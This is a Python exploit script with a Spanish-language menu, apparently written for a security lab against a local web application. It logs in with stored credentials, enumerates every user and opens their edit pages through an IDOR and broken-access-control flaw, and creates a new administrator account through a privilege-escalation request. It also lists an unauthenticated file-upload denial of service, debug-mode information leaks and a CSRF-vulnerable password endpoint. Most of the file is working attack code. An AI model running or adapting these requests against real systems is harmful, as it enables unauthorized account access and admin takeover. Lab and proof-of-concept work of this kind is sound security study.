import requests
import random
from dotenv import load_dotenv
import os
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time

# ______________________________________ CONFIGURACIÓN ______________________________________

load_dotenv()
base = os.getenv("base")
email = os.getenv("mail")
password = os.getenv("password")

menu = """
╔══════════════════════════════════════════════╗
║        Bienvenido a LARILIN - LAB            ║
║  "No es bueno delegar tu seguridad a la IA"  ║
╠══════════════════════════════════════════════╣
║  1) Ver / modif. datos de cualquier usuario  ║
║     └─ Vulnerabilidad: BAC / IDOR            ║
║                                              ║
║  2) Denegación de Servicio vía File Upload   ║
║     └─ Vulnerabilidad: Unrestricted Upload   ║
║                                              ║
║  3) Crear usuario administrador              ║
║     └─ Vulnerabilidad: Privilege Escalation  ║
║                                              ║
║  9) Otras vulnerabilidades no explotables    ║
║                                              ║
║  0) Salir del laboratorio                    ║
╚══════════════════════════════════════════════╝
"""


# ______________________________________ LOGIN ______________________________________


def login(email, password):
    login_url = base + '/auth/login'
    headers = {
        'Accept-Language': 'en-US,en;q=0.9',
        'Origin': 'http://127.0.0.1:5000',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Referer': 'http://127.0.0.1:5000/auth/login?next=%2F',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive'
    }
    data = f'email={email}&password={password}'
    try:
        response = requests.post(url=login_url, headers=headers, data=data, allow_redirects=False)
    except:
        print("El servidor no está lanzado.")
        return None, False

    cookies = response.cookies
    if '/users/consent' not in response.text:
        return None, False

    cookie_session = cookies['session']
    return cookie_session, True


# ______________________________________ CREAR ADMIN USER ______________________________________


def adminUser(ckses):
    email = f'ivan{random.randint(10000, 2000000)}@ivan.com'
    password = 'ivan'
    nombre_admin = 'ivan'
    create_user_url = base + '/users/create'
    headers = {
        'Accept-Language': 'en-US,en;q=0.9',
        'Origin': 'http://127.0.0.1:5000',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Referer': 'http://127.0.0.1:5000/auth/login?next=%2F',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Cookie' : f'session={ckses}'
    }
    data = f'nombre_admin={nombre_admin}&email_admin={email}&pass1={password}&pass2={password}'
    requests.post(url=create_user_url, headers=headers, data=data, allow_redirects=False)

    print(f"LOGIN: {email}:{password}")


# ______________________________________ LEER USUARIOS ______________________________________


def leerUsuarios(ckses):
    leerusuarios_url = base + '/users/'
    headers = {
        'Accept-Language': 'en-US,en;q=0.9',
        'Origin': 'http://127.0.0.1:5000',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Referer': 'http://127.0.0.1:5000/syllabus/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Cookie' : f'session={ckses}'
    }
    response = requests.get(url=leerusuarios_url, headers=headers, allow_redirects=False)
    soup = BeautifulSoup(response.text, "html.parser")
    container = soup.find("section", class_="container d-flex flex-wrap justify-content-center gap-3")
    usuarios = []

    if container:
        for card in container.find_all("section", class_="card-body d-flex flex-column"):
            u = {"id": None, "email": None, "rol": None}

            a = card.find("a", href=lambda x: x and x.startswith("/users/update/"))
            if a:
                u["id"] = a["href"].split("/")[-1]

            for p in card.select("p.card-text"):
                i = p.find("i")
                if not i: continue
                c = " ".join(i.get("class", []))
                v = p.get_text(strip=True)

                if "bi-envelope-at" in c:
                    if v and '**' not in v:
                        u["email"] = v
                elif "bi-person" in c:
                    u["rol"] = v

            if all(u.values()):
                usuarios.append(u)

    print()
    for i, u in enumerate(usuarios, start=1):
        print(f"[{i}] email: {u['email']} | rol: {u['rol']}")
    
    
    return usuarios

# ______________________________________ MODIFICAR USUARIO ______________________________________


def modificarUsuario(ckses):
    usuarios = leerUsuarios(ckses)
    seleccion = int(input("\nIntroduce el número del usuario a modificar: "))
    usuario = usuarios[seleccion - 1]
    idUserMod = usuario["id"]

    options = Options()
    options.add_argument("--disable-blink-features=AutomationControlled")

    driver = webdriver.Chrome(options=options)

    driver.get(base)

    driver.add_cookie({
        "name": "session",
        "value": ckses,
        "domain": "127.0.0.1",
        "path": "/"
    })

    driver.get(f"{base}/users/update/{idUserMod}")
    input("\nNavegador abierto. Pulsa ENTER para cerrar...")

    driver.quit()


# ______________________________________ APP ______________________________________


if __name__ == '__main__':
    os.system("clear")
    godzillaFeliz = True
    print(menu)

    print('Iniciando sesión en la app web usando la ".env" ...')
    ckses, exito = login(email, password)
    
    if exito:
        print("-> Se ha iniciado sesión")
    else:
        print("-> No se ha iniciado sesión")
        godzillaFeliz = False

    print("Cargando la aplicación...")   
    time.sleep(4)
    while godzillaFeliz:
        os.system("clear")

        print(menu)
        accion = int(input("¿Que deseas hacer?: "))

        if accion == 0:
            break

        elif accion == 1:
            modificarUsuario(ckses)

        elif accion == 2:
            os.system("clear")
            print("\nNo se puede hacer el ataque en local... \n" \
            "sin embargo a continuación te proporcion la información necesaria para que estes\n" \
            "al corriente del problema:\n" \
            "\nENDPOINTS AFECTADOS:\n" \
            "   - /lara/save_record\n" \
            "   - /audios/save_record\n" \
            "\n" \
            "INFORMACIÓN:\n" \
            "   - Estos endpoints no están protegidos ni por limite de fichero ni por autenticación.\n")
            input("PULSA ENTER PARA VOLVER AL MENÚ...")

        elif accion == 3:
            adminUser(ckses)
            input("Pulsa ENTER para continuar...")

        elif accion == 9:
            os.system("clear")
            print(
                "\nVulnerabilidades no explotables de forma directa:\n\n"

                "1) Information Disclosure - Debug Mode Enabled in Production\n"
                "   • La aplicación se ejecuta con DEBUG=TRUE en entorno productivo.\n"
                "   • Ante errores no controlados, se muestran trazas completas.\n"
                "   • Permite al atacante obtener información sensible como rutas o código.\n"
                "   • Ejemplo: provocar un error accediendo a /users/update/hola_mundo\n\n"

                "2) Error-Based Information Disclosure\n"
                "   • La aplicación no gestiona correctamente entradas inválidas.\n"
                "   • Los mensajes de error revelan detalles internos de la aplicación.\n"
                "   • Puede facilitar ataques posteriores (IDOR, BAC, RCE, etc.).\n\n"

                "3) Cross-Site Request Forgery (CSRF)\n"
                "   • Endpoint afectado: /update-pass/<id>\n"
                "   • No se valida token CSRF en la solicitud.\n"
            )
            input("Pulsa ENTER para continuar...")
